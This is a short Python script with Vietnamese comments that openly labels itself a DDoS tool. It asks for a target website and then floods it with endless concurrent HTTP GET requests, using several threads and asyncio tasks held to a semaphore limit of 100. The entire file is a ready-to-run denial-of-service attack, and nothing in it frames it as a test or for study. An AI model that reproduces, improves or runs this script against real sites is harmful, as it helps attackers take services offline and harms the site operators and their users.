import threading
import aiohttp
import asyncio
import sys
import time

# Nhập URL từ người dùng
url = input("Nhập Web Đi Idol: ").strip()
if not url.startswith(("http://", "https://")):
    url = "http://" + url

print(f"Đang DDoS: {url}")

# Giới hạn số request đồng thời
semaphore = asyncio.Semaphore(100)

async def gui_request(session, url):
    while True:
        async with semaphore:
            try:
                async with session.get(url) as response:
                    sys.stdout.write(f"\rRequest: {response.status}    ")
                    sys.stdout.flush()
            except:
                sys.stdout.write("\rLỗi kết nối    ")

async def main():
    async with aiohttp.ClientSession() as session:
        tasks = [gui_request(session, url) for _ in range(10)]
        await asyncio.gather(*tasks)

def chay():
    asyncio.run(main())

if __name__ == "__main__":
    for _ in range(5):  
        threading.Thread(target=chay).start()